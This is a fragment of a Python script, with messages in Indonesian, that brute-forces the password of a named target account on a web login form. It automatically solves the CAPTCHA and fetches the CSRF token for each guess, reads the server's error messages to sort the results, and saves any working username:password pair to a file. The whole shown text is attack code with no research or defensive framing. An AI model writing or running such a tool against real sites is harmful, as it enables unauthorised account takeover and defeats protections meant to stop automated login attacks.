...
def solve_captcha(session):
    ...
    for attempt in range(3):
        try:
            ...
            filename = f"captcha_debug/password_attempt_{attempt + 1}.png"
            img.save(filename)
...
print(f"\n🔐 Mulai brute force password untuk username: {username_target}\n")

# === Brute Force Password Loop ===
for password in passwords:
    print(f"🧪 Mencoba password: {password}")
    captcha, csrf_token = get_captcha_and_csrf()

    if not captcha or not csrf_token:
        print(f"[!] CAPTCHA/CSRF gagal untuk password: {password}, skip.")
        time.sleep(DELAY)
        continue
    ...
    if "password salah" in body:
        print(f"[×] Password salah: {password}")
    elif "captcha" in body:
        print(f"[!] CAPTCHA salah: '{captcha}'")
    elif "user tidak ditemukan" in body:
        print("[×] USER tidak ditemukan, padahal harusnya valid. Abort.")
        break
    else:
        print(f"[✅] Login BERHASIL dengan password: {password}")
        with open("berhasil_login.txt", "a") as f:
            f.write(f"{username_target}:{password}\n")
        break

    time.sleep(DELAY)

print("\n✅ Brute force password selesai.")
